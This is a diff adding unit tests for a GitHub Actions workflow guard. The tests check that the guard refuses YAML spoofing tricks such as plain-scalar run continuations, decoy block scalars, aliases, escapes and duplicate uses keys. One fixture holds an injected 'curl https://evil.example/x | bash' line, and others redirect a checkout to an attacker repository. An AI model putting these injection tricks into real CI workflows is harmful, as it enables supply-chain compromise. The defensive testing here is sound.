@@ -797,6 +797,111 @@ class GuardPlacementTests(unittest.TestCase):
             self.assertEqual(0, count)
             self.assertTrue(any('symlink' in problem for problem in problems), problems)
 
+    def test_a_configure_pages_step_may_not_carry_extra_inputs(self):
+        # configure-pages can run a site generator, so a with: (e.g. one writing into .trusted-main) is refused.
+        step = ('      - name: Configure Pages\n        uses: actions/configure-pages@v5\n'
+                '        with:\n          output_dir: .trusted-main\n')
+        text = GUARDED.replace(STAGE_STEP, step + STAGE_STEP)
+        self.assertNotEqual(GUARDED, text)
+        self.assertNotEqual([], self.violations(text))
+
+    def test_a_plain_scalar_run_continuation_cannot_spoof_a_trusted_step(self):
+        # CRITICAL: an inline `run:` is a YAML plain scalar that continues onto any more-indented line, so the whole
+        # command is not the one line the guard matched. A trusted py-resolve step must not accept the exact command
+        # plus an injected `; <command>` on the next line.
+        injected = ('      - name: Resolve python3 (trusted)\n        id: pyresolve\n'
+                    '        run: echo "python=$(command -v python3)" >> "$GITHUB_OUTPUT"\n'
+                    '          ; echo INJECTED > /tmp/pwned ; curl https://evil.example/x | bash\n')
+        text = GUARDED.replace(PY_RESOLVE, injected)
+        self.assertNotEqual(GUARDED, text)
+        self.assertNotEqual([], self.violations(text))
+
+    def test_a_decoy_with_inside_a_block_scalar_cannot_fake_the_trusted_checkout(self):
+        # CRITICAL: a `name: |` block holding a fake `with:` with the trusted inputs, followed by the real `with:`
+        # that adds `repository:`, must not be accepted as the trusted checkout.
+        decoy = ('      - name: |\n'
+                 '          Trusted guard (main)\n'
+                 '          with:\n'
+                 '            ref: main\n'
+                 '            path: .trusted-main\n'
+                 '            sparse-checkout: tools/artifact_guard.py\n'
+                 '            sparse-checkout-cone-mode: false\n'
+                 '        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
+                 '        with:\n'
+                 '          repository: attacker/evil-guard\n'
+                 '          ref: main\n'
+                 '          path: .trusted-main\n'
+                 '          sparse-checkout: tools/artifact_guard.py\n'
+                 '          sparse-checkout-cone-mode: false\n'
+                 '          persist-credentials: false\n')
+        text = GUARDED.replace(TRUSTED_CHECKOUT, decoy)
+        self.assertNotEqual(GUARDED, text)
+        self.assertNotEqual([], self.violations(text))
+
+    def test_a_trusted_checkout_hidden_in_a_block_scalar_is_refused(self):
+        # MEDIUM: a step whose `uses:`/trusted with: lines live in a `name: |` block and whose real key is `run:` must
+        # not count as the trusted checkout (it checks nothing out, so the guard file is not pinned).
+        fake = ('      - name: |\n'
+                '          with:\n'
+                '            ref: main\n'
+                '            path: .trusted-main\n'
+                '            sparse-checkout: tools/artifact_guard.py\n'
+                '            sparse-checkout-cone-mode: false\n'
+                '          uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
+                '        run: echo "python=$(command -v python3)" >> "$GITHUB_OUTPUT"\n')
+        text = GUARDED.replace(TRUSTED_CHECKOUT, fake)
+        self.assertNotEqual(GUARDED, text)
+        self.assertNotEqual([], self.violations(text))
+
+    def test_an_aliased_with_cannot_smuggle_a_repository_override(self):
+        # CRITICAL: `with: *alias` is not a plain block the guard can read, and the anchor may add `repository:`.
+        step = ('      - name: |\n'
+                '          ref: main\n'
+                '          path: .trusted-main\n'
+                '          sparse-checkout: tools/artifact_guard.py\n'
+                '          sparse-checkout-cone-mode: false\n'
+                '        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
+                '        with: *trusted_inputs\n')
+        text = ('x-trusted: &trusted_inputs\n  ref: main\n  path: .trusted-main\n'
+                '  sparse-checkout: tools/artifact_guard.py\n  sparse-checkout-cone-mode: false\n'
+                '  repository: attacker/evil-guard\n' + GUARDED.replace(TRUSTED_CHECKOUT, step))
+        self.assertNotEqual([], self.violations(text))
+
+    def test_the_first_checkout_may_not_be_redirected_away_from_the_pull_request(self):
+        # MAJOR: if step 0 checks out main (or another repository), --check-placement reads a different workflow set
+        # from the one GitHub runs. Its with: may not carry ref:, repository: or token:/ssh-key:.
+        for override in ('          ref: main\n', '          repository: attacker/benign\n',
+                         '          token: ${{ secrets.GITHUB_TOKEN }}\n'):
+            with self.subTest(override=override):
+                text = GUARDED.replace(PR_CHECKOUT, PR_CHECKOUT.replace('          persist-credentials: false\n',
+                                                                        override + '          persist-credentials: false\n'))
+                self.assertNotEqual(GUARDED, text)
+                self.assertNotEqual([], self.violations(text))
+        self.assertEqual([], self.violations(GUARDED))
+
+    def test_a_uses_value_with_an_escape_or_alias_is_refused(self):
+        # MAJOR: `\x61` in a double-quoted uses value resolves to `a`, so the literal text hides upload-artifact; an
+        # alias can point at an anchor defined elsewhere. Both are refused.
+        escape = GUARDED.replace('uses: ' + UPLOAD, 'uses: "actions/upload-\\x61rtifact@ea165f8d65b6e75b540449e92b4886f43607fa02"')
+        self.assertNotEqual(GUARDED, escape)
+        with self.assertRaises(ValueError):
+            self.violations(escape)
+        alias = 'x-save: &s ' + UPLOAD + '\n' + GUARDED.replace('uses: ' + UPLOAD, 'uses: *s')
+        with self.assertRaises(ValueError):
+            self.violations(alias)
+
+    def test_a_duplicate_uses_key_masks_the_step_action(self):
+        # MEDIUM: a step with two uses: keys is classified by the first, but the YAML parser (last one wins) would run
+        # the second (a checkout into .trusted-main).
+        text = GUARDED.replace(STAGE_STEP,
+                               '      - name: Sneaky\n'
+                               '        uses: actions/configure-pages@v5\n'
+                               '        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
+                               '        with:\n          ref: ${{ github.head_ref }}\n          path: .trusted-main\n'
+                               + STAGE_STEP)
+        self.assertNotEqual(GUARDED, text)
+        self.assertNotEqual([], self.violations(text))
+
 
 
 class TrustedCopyTests(unittest.TestCase):
